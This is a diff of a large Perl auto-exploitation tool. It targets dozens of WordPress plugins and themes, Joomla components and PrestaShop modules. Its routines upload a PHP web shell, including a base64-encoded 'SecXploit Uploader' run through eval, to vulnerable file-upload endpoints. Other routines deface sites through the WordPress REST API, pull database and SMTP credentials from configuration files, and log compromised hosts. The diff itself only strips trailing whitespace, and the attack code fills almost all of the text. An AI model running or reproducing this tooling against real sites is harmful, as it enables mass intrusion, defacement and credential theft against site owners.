 <?php eval (base64_decode("ZWNobyAnPHRpdGxlPlNlY1hwbG9pdCB2MS4wIDwvdGl0bGU+JzsKZWNobyAnPGNlbnRlcj48aDE+U2VjWHBsb2l0IFVwbG9hZGVyPC9oMT48Y2VudGVyPic7CmlmKCRfR0VUWydYJ109PSJYcGxvaXQiKXsKZWNobyAiPGNlbnRlcj48Yj5VbmFtZToiLnBocF91bmFtZSgpLiI8L2I+IjsgCmVjaG8gJzxmb250IGNvbG9yPSJibGFjayIgc2l6ZT0iNCI+JzsKaWYoaXNzZXQoJF9QT1NUWydTdWJtaXQnXSkpewogICAgJGZpbGVkaXIgPSAiIjsgCiAgICAkbWF4ZmlsZSA9ICcyMDAwMDAwJzsKICAgICRtb2RlID0gJzA2NDQnOwogICAgJHVzZXJmaWxlX25hbWUgPSAkX0ZJTEVTWydpbWFnZSddWyduYW1lJ107CiAgICAkdXNlcmZpbGVfdG1wID0gJF9GSUxFU1snaW1hZ2UnXVsndG1wX25hbWUnXTsKICAgIGlmKGlzc2V0KCRfRklMRVNbJ2ltYWdlJ11bJ25hbWUnXSkpIHsKICAgICAgICAkcXggPSAkZmlsZWRpci4kdXNlcmZpbGVfbmFtZTsKICAgICAgICBAbW92ZV91cGxvYWRlZF9maWxlKCR1c2VyZmlsZV90bXAsICRxeCk7CiAgICAgICAgQGNobW9kICgkcXgsIG9jdGRlYygkbW9kZSkpOwplY2hvIiA8YSBocmVmPSR1c2VyZmlsZV9uYW1lPjxjZW50ZXI+PGI+U3VjZXNzIFVwbG9hZCAhISEgPT0+ICR1c2VyZmlsZV9uYW1lPC9iPjwvY2VudGVyPjwvYT4iOwp9Cn0KZWxzZXsKZWNobyc8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIyIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImltYWdlIj48YnI+PGlucHV0IHR5cGU9IlN1Ym1pdCIgbmFtZT0iU3VibWl0IiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsKfQplY2hvICc8L2NlbnRlcj48L2ZvbnQ+JzsKfQ")); ?>';
 my $body = $ua->post( $izo,
@@ -2164,7 +2171,7 @@ my $body = $ua->post( $izo,
 		print color('bold red'),"waiting...\n";
 		}
 my $checkfoxupx = $ua->get("$site/components/com_b2jcontact/uploads/izoc.php")->content;
-if ($checkfoxupx =~ /X Xploit/) {	
+if ($checkfoxupx =~ /X Xploit/) {
 print color('bold red'),"Shell Uploaded Successfully\n";
 print color('bold green'),"[ShellLink] => $site/components/com_b2jcontact/uploads/izoc.php\n";
 		    print color('reset');
@@ -2177,14 +2184,14 @@ print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"B2j Contact";
 print color('bold white')," ....................... ";
-print color('bold red'),"NOT VULN\n";			
+print color('bold red'),"NOT VULN\n";
 }
 }
 }
 }
 }
 #############################################
-sub developertools(){ 
+sub developertools(){
 my $url = "$site/wp-content/plugins/developer-tools/libs/swfupload/upload.php";
 
 my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'UPLOADDIR'=>'../', 'ADMINEMAIL'=>'test@example.com', 'Filedata' => ["Xploit.php"]]);
@@ -2219,7 +2226,7 @@ print color('bold white'),"\n";
 }
 }
 #############################################
-sub genesissimple(){ 
+sub genesissimple(){
 my $url = "$site/wp-content/plugins/genesis-simple-defaults/uploadFavicon.php";
 
 my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'upload-favicon'=>'fake', 'iconImage' => ["Xploit.php"]]);
@@ -2255,7 +2262,7 @@ print color('bold white'),"\n";
 }
 
 ################ joom plugin #####################
-sub simpleplugin(){ 
+sub simpleplugin(){
 my $url = "$site/administrator/components/com_simplephotogallery/lib/uploadFile.php";
 
 my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => ['uploadfile' => ["Xploit.php"], "jpath" => "..%2F..%2F..%2F..%2F" ]);
@@ -2299,7 +2306,7 @@ my $field_name = "files[]";
 my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 
 $sexyup="$site/com_sexycontactform/fileupload/files/Xploit.php";
@@ -2329,7 +2336,7 @@ print color('red'),"NOT VULN\n";
 }
 }
 ################ Creative Contact Form #####################
-sub sexycontactform(){ 
+sub sexycontactform(){
 my $url = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php";
 $sexycontactup = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/files/Xploit.php";
 my $field_name = "files[]";
@@ -2337,7 +2344,7 @@ my $field_name = "files[]";
 my $sexycontactres = $ua->post( $url,
             Content_Type => 'form-data',
             Content => [ $field_name => ["Xploit.php"] ]
-           
+
             );
 
 $checksexycontactup = $ua->get("$sexycontactup")->content;
@@ -2408,7 +2415,7 @@ my $field_name = "file[]";
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
             Content => [ $field_name => ["$image"] ]
-           
+
             );
 
 $jobmangerup = "$site/wp-content/uploads/job-manager-uploads/file/$year/$month/Xploit.gif";
@@ -2565,7 +2572,7 @@ $ajx = $site . '/wp-json/wp/v2/posts/'.$id;
 
 
 
-	
+
 $defx="														<h2><center>Security Xploit Attacker <center></h2>
 						</div>
 						<div class=\"post_content\">
@@ -2587,8 +2594,8 @@ $stat = $response->content;
    print color('bold green');
 print "[Succes]\n";
     print color('reset');
-				    open(TEXT, '>>Result_v4/index.txt');  
-    print TEXT "$def\n";  
+				    open(TEXT, '>>Result_v4/index.txt');
+    print TEXT "$def\n";
     close(TEXT);
 zoneh();
 
@@ -2627,9 +2634,9 @@ close(TEXT);
 	}}
 ####################################################################################################
 
-	
-	
-	
+
+
+
 sub ajaxstore(){              print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"ajax-store-locator-wordpress_0 .... ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -2650,10 +2657,10 @@ close(TEXT);
     print color('reset');
 	}}
 ####################################################################################################
-	
-	
-	
-	
+
+
+
+
 sub Antioch(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Antioch ........................... ";
@@ -2675,10 +2682,10 @@ close(TEXT);
     print color('reset');
 	}}
 ####################################################################################################
-	
-	
-	
-	
+
+
+
+
 sub Authentic(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Authentic ......................... ";
@@ -2700,10 +2707,10 @@ close(TEXT);
     print color('reset');
 	}}
 ####################################################################################################
-	
-	
-	
-	
+
+
+
+
 sub Churchope(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Churchope ......................... ";
@@ -2725,12 +2732,12 @@ close(TEXT);
     print color('reset');
 	}}
 ####################################################################################################
-	
-	
-	
-	
-	
-	
+
+
+
+
+
+
 sub Epic(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Epic .............................. ";
@@ -2751,17 +2758,17 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 ####################################################################################################
-	
-	
-	
-	
-	
-	
-	
-	
-	
+
+
+
+
+
+
+
+
+
 sub Felis(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Felis ............................. ";
@@ -2782,18 +2789,18 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
-	
-	
-####################################################################################################
-	
 
-	
-	
-	
-	
-	
-	
+
+
+####################################################################################################
+
+
+
+
+
+
+
+
 sub Force(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Force-Download .................... ";
@@ -2814,18 +2821,18 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
-	
-	
-####################################################################################################
-	
-	
-	
-	
-	
 
-	
-	
+
+
+####################################################################################################
+
+
+
+
+
+
+
+
 sub FR0(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"FR0_theme ......................... ";
@@ -2846,11 +2853,11 @@ close(TEXT);
     print "NOT VULN ";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 
-	
-	
+
+
 sub hbaudio(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"hb-audio-gallery-lite ............. ";
@@ -2871,7 +2878,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 sub History(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
@@ -2893,7 +2900,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 
 sub Imageex(){
@@ -2918,11 +2925,11 @@ close(TEXT);
 	}}
 	####################################################################################################
 
-	
-	
-	
-	
-	
+
+
+
+
+
 sub kbslider(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"kbslider_show_image ............... ";
@@ -2943,13 +2950,13 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
-	
-	
+
+
+
 	####################################################################################################
 
-	
-	
+
+
 sub Linenity(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Linenity .......................... ";
@@ -2970,10 +2977,10 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 ####################################################################################################
-	
-	
+
+
 sub Lote27(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Lote27 ............................ ";
@@ -2994,13 +3001,13 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 ####################################################################################################
-	
-	
-	
-	
-	
+
+
+
+
+
 sub Markant(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Markant ........................... ";
@@ -3022,8 +3029,8 @@ close(TEXT);
     print color('reset');
 	}}
 ####################################################################################################
-	
-	
+
+
 sub MichaelCanthony(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"MichaelCanthony ................... ";
@@ -3044,10 +3051,10 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 ####################################################################################################
-	
-	
+
+
 sub mTheme(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"mTheme-Unus ....................... ";
@@ -3068,10 +3075,10 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 
-	
+
 sub NativeChurch(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"NativeChurch ...................... ";
@@ -3092,8 +3099,8 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
-	
+
+
 	####################################################################################################
 
 sub Parallelus(){
@@ -3118,8 +3125,8 @@ close(TEXT);
 	}}
 	####################################################################################################
 
-	
-	
+
+
 sub RedSteel(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"RedSteel .......................... ";
@@ -3142,9 +3149,9 @@ close(TEXT);
 	}}
 	####################################################################################################
 
-	
-	
-sub Revsliderss(){             
+
+
+sub Revsliderss(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Revslider ......................... ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3164,12 +3171,12 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
-	
+
+
 ####################################################################################################
 
-	
-sub S3bubble(){             
+
+sub S3bubble(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"S3bubble-amazon-s3-html-5 ......... ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3189,11 +3196,11 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 
-	
-sub SMWF(){             
+
+sub SMWF(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"SMWF .............................. ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3214,8 +3221,8 @@ close(TEXT);
     print color('reset');
 	}}
 ####################################################################################################
-	
-	
+
+
 sub TheLoft(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"TheLoft ........................... ";
@@ -3236,7 +3243,7 @@ close(TEXT);
     print "NOT VULN ";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 
 sub Trinity(){
@@ -3259,13 +3266,13 @@ close(TEXT);
     print "NOT VULN ";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
-	
-	
-	
+
+
+
+
 ####################################################################################################
-	
-sub Urbancity(){             
+
+sub Urbancity(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Urbancity ......................... ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3285,12 +3292,12 @@ close(TEXT);
     print "NOT VULN ";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 
-	
-	
-sub Yakimabait(){            
+
+
+sub Yakimabait(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Yakimabait ........................ ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3310,13 +3317,13 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
-	
+
+
 	####################################################################################################
 
-	
-	
-sub Membership(){          
+
+
+sub Membership(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Membership Simplified v1.58 ....... ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3337,10 +3344,10 @@ close(TEXT);
     print color('reset');
 	}}
 ####################################################################################################
-	
-	
-	
-sub FileManagerwp(){             
+
+
+
+sub FileManagerwp(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Wp-FileManager .................... ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3360,11 +3367,11 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 
-	
-sub Googlemp3(){             
+
+sub Googlemp3(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Google-mp3-audio-player ........... ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3385,10 +3392,10 @@ close(TEXT);
     print color('reset');
 	}}
 ####################################################################################################
-	
-	
-	
-sub Justifiedim(){           
+
+
+
+sub Justifiedim(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Justified-image-grid 1 ............ ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3408,11 +3415,11 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 
-	
-sub Justified2(){           
+
+sub Justified2(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Justified-image-grid 2 ............ ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3432,11 +3439,11 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 
-	
-sub Justified3(){            
+
+sub Justified3(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Justified-image-grid 3 ............ ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3456,12 +3463,12 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 
-	
-	
-sub Aspose(){            
+
+
+sub Aspose(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Aspose-cloud-ebook-generator ...... ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3481,13 +3488,13 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 
 	####################################################################################################
 
-	
-	
-sub Asposedoc(){           
+
+
+sub Asposedoc(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Aspose-doc-exporter ............... ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3507,11 +3514,11 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 
-	
-sub MiwoFTP(){             
+
+sub MiwoFTP(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"MiwoFTP 1.0.5  1 .................. ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3531,11 +3538,11 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 
-	
-sub MiwoFTP2(){          
+
+sub MiwoFTP2(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"MiwoFTP 1.0.5  2 .................. ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3555,13 +3562,13 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
-	
+
+
 	####################################################################################################
 
-	
-	
-sub miniaudioplayer(){          
+
+
+sub miniaudioplayer(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Wp-miniaudioplayer ................ ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3581,11 +3588,11 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 
-	
-sub Ypotheme(){           
+
+sub Ypotheme(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Ypo-theme ......................... ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3605,13 +3612,13 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 
-	
-	
-	
-sub Media14(){           
+
+
+
+sub Media14(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"N-Media 1.4 ....................... ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3631,12 +3638,12 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
-	
-	
+
+
+
 	####################################################################################################
 
-sub wpmon(){  
+sub wpmon(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Wp-mon ............................ ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -3656,11 +3663,11 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 	####################################################################################################
 
-	
-sub mapprolbs(){ 
+
+sub mapprolbs(){
 print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Ibs-mappro ........................ ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
@@ -4161,7 +4168,7 @@ my $field_name = "images[]";
 my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $fieldvmegamenuup="$site/modules/fieldvmegamenu/uploads/Xploit.php";
 
@@ -4217,7 +4224,7 @@ my $field_name = "images[]";
 my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $pk_flexmenuup="$site/modules/pk_flexmenu/uploads/Xploit.php";
 
@@ -4250,7 +4257,7 @@ my $field_name = "images[]";
 my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $pk_vertflexmenuup="$site/modules/pk_vertflexmenu/uploads/Xploit.php";
 my $checkpk_vertflexmenu = $ua->get("$pk_vertflexmenuup")->content;
@@ -4280,7 +4287,7 @@ my $field_name = "images[]";
 my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $nvn_export_ordersup="$site/modules/nvn_export_orders/nvn_extra_add.php";
 
@@ -4310,7 +4317,7 @@ my $field_name = "Filedata";
 my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $megamenuup="$site/Xploit.php.png";
 
@@ -4341,7 +4348,7 @@ my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             data => 'bajatax',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $tdpsthemeoptionpanelup="$site/modules/tdpsthemeoptionpanel/upload/Xploit.php";
 
@@ -4373,7 +4380,7 @@ my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             data => 'bajatax',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $psmodthemeoptionpanelup="$site/modules/psmodthemeoptionpanel/upload/Xploit.php";
 
@@ -4404,7 +4411,7 @@ my $field_name = "file";
 my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $masseditproductup="$site/masseditproduct/uploads/file/Xploit.php";
 
@@ -4631,7 +4638,7 @@ OUTER: foreach $vulz(@filesz){
 my $url = "$site/$vulz";
 print colored ("[ Scanning Foxcontact]",'green'),$url."\n";
 my $checkfoxupx = $ua->get("$url")->content;
-if ($checkfoxupx =~ /foxcontact/) {	
+if ($checkfoxupx =~ /foxcontact/) {
 	my $regex='<a name="cid_(.*?)">';
     if($checkfoxupx =~ s/$regex//){
 		my $regex='<a name="mid_(.*?)">';
@@ -4640,7 +4647,7 @@ if ($checkfoxupx =~ /foxcontact/) {
 my @files = ('components/com_foxcontact/lib/file-uploader.php?cid='.$1.'&mid='.$1.'&qqfile=/../../Xploit.php','index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id='.$1.'?cid='.$1.'&mid='.$1.'&qqfile=/../../Xploit.php','index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id='.$1.'&cid='.$1.'&mid='.$1.'&owner=module&id='.$1.'&qqfile=/../../Xploit.php','components/com_foxcontact/lib/uploader.php?cid='.$1.'&mid='.$1.'&qqfile=/../../Xploit.php');
 OUTER: foreach my $vul(@files){
 chomp $vul;
- my $izo = $site . $vul; 
+ my $izo = $site . $vul;
 my $indexa='
 <?php eval (base64_decode("ZWNobyAnPHRpdGxlPlNlY1hwbG9pdCB2MS4wIDwvdGl0bGU+JzsKZWNobyAnPGNlbnRlcj48aDE+U2VjWHBsb2l0IFVwbG9hZGVyPC9oMT48Y2VudGVyPic7CmlmKCRfR0VUWydYJ109PSJYcGxvaXQiKXsKZWNobyAiPGNlbnRlcj48Yj5VbmFtZToiLnBocF91bmFtZSgpLiI8L2I+IjsgCmVjaG8gJzxmb250IGNvbG9yPSJibGFjayIgc2l6ZT0iNCI+JzsKaWYoaXNzZXQoJF9QT1NUWydTdWJtaXQnXSkpewogICAgJGZpbGVkaXIgPSAiIjsgCiAgICAkbWF4ZmlsZSA9ICcyMDAwMDAwJzsKICAgICRtb2RlID0gJzA2NDQnOwogICAgJHVzZXJmaWxlX25hbWUgPSAkX0ZJTEVTWydpbWFnZSddWyduYW1lJ107CiAgICAkdXNlcmZpbGVfdG1wID0gJF9GSUxFU1snaW1hZ2UnXVsndG1wX25hbWUnXTsKICAgIGlmKGlzc2V0KCRfRklMRVNbJ2ltYWdlJ11bJ25hbWUnXSkpIHsKICAgICAgICAkcXggPSAkZmlsZWRpci4kdXNlcmZpbGVfbmFtZTsKICAgICAgICBAbW92ZV91cGxvYWRlZF9maWxlKCR1c2VyZmlsZV90bXAsICRxeCk7CiAgICAgICAgQGNobW9kICgkcXgsIG9jdGRlYygkbW9kZSkpOwplY2hvIiA8YSBocmVmPSR1c2VyZmlsZV9uYW1lPjxjZW50ZXI+PGI+U3VjZXNzIFVwbG9hZCAhISEgPT0+ICR1c2VyZmlsZV9uYW1lPC9iPjwvY2VudGVyPjwvYT4iOwp9Cn0KZWxzZXsKZWNobyc8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIyIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImltYWdlIj48YnI+PGlucHV0IHR5cGU9IlN1Ym1pdCIgbmFtZT0iU3VibWl0IiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsKfQplY2hvICc8L2NlbnRlcj48L2ZvbnQ+JzsKfQ")); ?>';
 my $body = $ua->post( $izo,
@@ -4648,7 +4655,7 @@ my $body = $ua->post( $izo,
         Content => $indexa
         );
 $foxups="$site/components/com_foxcontact/Xploit.php";
-}		
+}
 my $checkfoxup = $ua->get("$foxups")->content;
 if ($checkfoxup =~ /X Xploit/) {
 print color('bold red'),"[";
@@ -4771,7 +4778,7 @@ my $field_name = "Filedata[]";
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
             Content => [ $field_name => ["$index"] ]
-           
+
             );
 
 $weblinksup= "$site/images/Xploit.gif";
@@ -4857,8 +4864,8 @@ $ua->timeout(10);
 $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
 my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["Xploit1.jpg"], name => "ph.hitachi.html"]);
 if ($exploit->decoded_content =~ /ph.hitachi.html/) {
-        open(TEXT, '>>Result/index.txt');   
-    print TEXT "[ads] $site\n";   
+        open(TEXT, '>>Result/index.txt');
+    print TEXT "[ads] $site\n";
     close(TEXT);
 
     $def="$site/tmp/plupload/ph.hitachi.html";
@@ -4907,14 +4914,14 @@ print "VULN";
 print color('reset');
 print color('bold white');
 print color('reset');
-    open(TEXT, '>>Result/Try manual.txt');   
-    print TEXT "[hdflv] $site\n";   
+    open(TEXT, '>>Result/Try manual.txt');
+    print TEXT "[hdflv] $site\n";
     close(TEXT);
         open (TEXT, '>>Result/databases.txt');
         print TEXT "$site\n[+]DATABASE INFO\n";
         close (TEXT);
-		
-        print color("white"),"\t 
+
+        print color("white"),"\t
         [+]DATABASE INFO\n";
         if ($cont =~ /user = \'(.*?)\';/){
         print color("green"),"\t[+]Database User = $1 \n";
@@ -5006,7 +5013,7 @@ print color("white"),"\t[+] SMTP INFO\n";
         open (TEXT, '>>Result/databases.txt');
         print TEXT "[-]SMTP Host = $1\n";
         close (TEXT);
-  
+
 }
 
 }else{
@@ -5039,7 +5046,7 @@ my $field_name = "Filedata[]";
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
             Content => [ $field_name => ["$index"] ]
-           
+
             );
 
 $mediaup="$site/images/Xploit.html";
@@ -5073,11 +5080,11 @@ print color('bold red'),"NOT VULN\n";
 }
 
 ############################################################
-sub com_content(){ 
+sub com_content(){
 print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
-             
+
 print color('bold white'),"Com content ....................... ";
 $ua = LWP::UserAgent->new(keep_alive => 1);
 $ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
@@ -5096,7 +5103,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_search(){             print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5118,7 +5125,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_admin1(){             print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5140,7 +5147,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_admin2(){              print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5162,7 +5169,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_content1(){       print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5184,7 +5191,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_content2(){             print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5206,7 +5213,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_weblinks(){              print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5228,7 +5235,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
     print color('reset');
 	}}
-	
+
 sub com_mailto(){              print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -5250,7 +5257,7 @@ close(TEXT);
     print "NOT VULN";print color('bold white'),"\n";
